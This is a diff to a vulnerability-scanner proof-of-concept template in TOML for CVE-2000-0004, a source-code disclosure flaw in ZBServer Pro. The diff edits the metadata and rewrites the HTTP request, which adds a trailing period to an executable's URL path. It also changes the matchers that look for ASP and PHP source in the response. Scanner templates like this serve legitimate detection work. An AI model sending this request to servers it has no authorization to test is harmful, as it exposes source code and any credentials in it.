@@ -1,10 +1,10 @@
 [info]
-author = "ave"
-description = "ZBServer Pro 在处理请求 URL 时未正确过滤路径中的点号，攻击者在可执行文件（如 .cgi、.exe、.asp 等）请求路径中插入一个点号（.），可绕过服务器对源代码的访问限制，从而读取脚本/可执行文件的源码。本 PoC 通过向目标发送特制 HTTP 请求并匹配返回内容中是否包含源码特征来验证漏洞存在。"
+author = "AVE"
+description = "检测 ZBServer Pro 是否在请求 URL 末尾添加句点（.）后泄露可执行文件源代码"
 id = "POC-AVE-2000-0006"
-name = "CVE-2000-0004 ZBServer Pro 源码泄露 PoC"
+name = "ZBServer Pro Source Code Disclosure PoC"
 severity = "medium"
-tags = ["ave-2000-0006"]
+tags = ["cve-2000-0004"]
 vuln_id = [
     "CVE-2000-0004",
     "AVE-2000-0006",
@@ -15,25 +15,16 @@ logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/index.cgi."
+path = "/{{BaseURL}}/{{Path}}."
 protocol = "http"
-
-[poc.requests.body]
-content = ""
-type = "raw"
-
-[poc.requests.headers]
-User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
 words = [
-    "#!/",
-    "<?",
-    "function ",
-    "sub ",
-    "def ",
+    "<%",
     "<?php",
+    "Response.Write",
+    "Server.CreateObject",
 ]
